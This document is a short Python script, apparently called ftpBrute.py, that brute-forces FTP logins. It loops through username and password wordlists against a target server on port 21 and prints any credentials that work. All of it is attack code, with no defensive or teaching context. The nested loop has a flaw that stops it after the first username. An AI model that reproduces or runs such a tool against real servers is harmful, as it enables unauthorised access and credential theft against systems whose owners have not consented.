import ftplib
import sys
if len(sys.argv) != 4:
    print("ftpBrute.py <FTPServer> <UserDic> <PasswordDic>")
    sys.exit(1)
FTPServer = sys.argv[1]
UserDic = sys.argv[2]
PasswordDic = sys.argv[3]
def login(FTPServer,username,passwords):
    try:
        f = ftplib.FTP(FTPServer)
        rs = f.connect(FTPServer,21,timeout=10)
        print(rs)
        f.login(username,passwords)
        f.quit()
        print("[+]username is %s and password is %s"%(username,passwords))
    except ftplib.all_errors as e:
        print(e)
        pass

def main():
    usernameFile=open(UserDic,'r')
    passwordsFile = open(PasswordDic,'r')
    for user in usernameFile.readlines():
        for passwords in passwordsFile.readlines():
            user = user.strip('\n')
            passwords = passwords.strip('\n')
            login(FTPServer,user,passwords)

if __name__ == '__main__':
    main()